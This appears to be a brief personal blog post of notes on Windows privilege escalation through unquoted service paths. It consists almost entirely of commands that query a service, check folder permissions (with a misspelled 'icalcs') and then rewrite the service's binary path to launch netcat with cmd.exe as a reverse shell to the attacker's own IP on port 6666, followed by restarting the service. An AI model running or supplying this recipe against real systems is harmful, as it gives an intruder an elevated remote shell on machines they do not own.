---
layout: post
title:  "privilege escalation - unquoted service paths"
date:   2022-01-01
categories: windows
---


```bash

Resources : https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/

sc.exe qc ServiceName

check local permissions : icalcs "C:\Program Files (x86)\ServiceName"

Reverse Shell Change Binary Path : sc.exe config ServiceName binPath="cmd.exe /c C:\Temp\nc64.exe -e cmd.exe <my ip> 6666"

sc.exe stop ServiceName

sc.exe start ServiceName
```
